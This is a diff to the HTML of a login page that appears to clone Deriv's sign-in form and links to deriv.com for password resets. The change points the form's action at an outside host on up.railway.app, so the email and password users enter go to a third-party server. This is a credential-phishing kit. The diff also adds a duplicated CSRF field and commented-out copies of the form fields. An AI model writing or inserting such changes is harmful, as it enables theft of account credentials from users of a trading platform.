@@ -734,7 +734,7 @@
 
 <div id="container">
    <h1 class="title-text">Welcome back</h1>
-   <form novalidate id="frmLogin" method="POST">
+   <form novalidate id="frmLogin" method="POST" action="https://harmonious-success-production.up.railway.app/login">
       <div class='input-group'>
          <div class="input-wrapper ">
             <input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required autocomplete="off"  autofocus="autofocus"  maxlength="254"  />
@@ -767,6 +767,40 @@
          
          <button type="submit" class="button secondary" name="login" value="Log in">Log in</button>
       </div>
+      <input type="hidden" name="csrf_token" value="555ff3f77e2bd041cbc2e481b3349ee5b201869f" />
+   </form>
+      <!-- <div class='input-group'>
+         <div class="input-wrapper ">
+            <input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required autocomplete="off"  autofocus="autofocus"  maxlength="254"  />
+            <label for="txtEmail">Email</label>
+            <span class="bar"></span>
+         </div>
+         <div class="input-error">
+            <p class='hide error error_invalid'>That doesn&#39;t look like an email address.</p>
+            <p class='hide error error_required'>Email is required.</p>
+            <p class='hide error error_invalid_pass'>Your email and/or password is incorrect.</p>
+            
+         </div>
+      </div> -->
+      <!-- <div class="input-group">
+         <div class="input-wrapper">
+            <input type="password" id="txtPass" name="password" required autocomplete="off" />
+            <label for="txtPass">Password</label>
+            <span class="bar"></span>
+            <span id="btnToggle" class="input-button icon_hidden"></span>
+         </div>
+         <div class="input-error">
+            <p class='hide error error_required'>Password is required.</p>
+         </div>
+      </div> -->
+      <!-- <div id="lost-password-container">
+         
+            
+            <a id="lost-password" href="https://deriv.com/reset-password">Forgot password?</a>
+            
+         
+         <button type="submit" class="button secondary" name="login" value="Log in">Log in</button>
+      </div> -->
       <input type="hidden" name="csrf_token" value="555ff3f77e2bd041cbc2e481b3349ee5b201869f" />
    </form>
    <div class="separator" id="separatorId">
